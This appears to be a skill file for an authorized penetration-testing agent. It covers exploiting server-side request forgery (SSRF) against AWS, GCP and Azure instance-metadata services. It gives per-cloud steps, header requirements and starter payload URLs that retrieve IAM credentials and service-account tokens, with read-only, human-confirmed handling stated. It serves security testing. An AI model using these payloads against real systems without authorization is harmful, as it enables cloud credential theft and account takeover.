---
name: ssrf-cloud-metadata
description: >-
  Exploit SSRF against cloud instance-metadata services to steal credentials/config (CWE-918):
  AWS IMDSv1 `169.254.169.254`, GCP `metadata.google.internal` (with `Metadata-Flavor`), Azure
  IMDS, and handling IMDSv2's token requirement. Invoke when SSRF can reach link-local metadata.
  Often the shortest SSRF→cloud-account-takeover path.
family: 06-ssrf-request-layer
type: exploit
owasp: [A10:2021]
cwe: [CWE-918]
requires: [scope-guard, ssrf-triage, evidence-recorder]
authorization: required
---

# SSRF → Cloud Metadata

## Invoke when
- SSRF can reach `169.254.169.254` / `metadata.google.internal` / Azure IMDS.

## Methodology
1. AWS IMDSv1: `.../latest/meta-data/iam/security-credentials/<role>` → temp creds.
2. AWS IMDSv2: needs a PUT for a token first — only works if SSRF allows the header/verb.
3. GCP: requires header `Metadata-Flavor: Google` — check if SSRF lets you set headers.
4. Azure: `http://169.254.169.254/metadata/instance?api-version=...` + `Metadata:true`.
5. Report creds without using them beyond a scoped read; do NOT act on stolen keys.

## Starter payloads
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`

## False-positive filters
- IMDSv2/header-gated endpoints returning 401 without a token = mitigated for header-less SSRF.

## Chains to
- `chain-builder` (cloud-account impact narrative); creds handling stays read-only, human-confirmed.
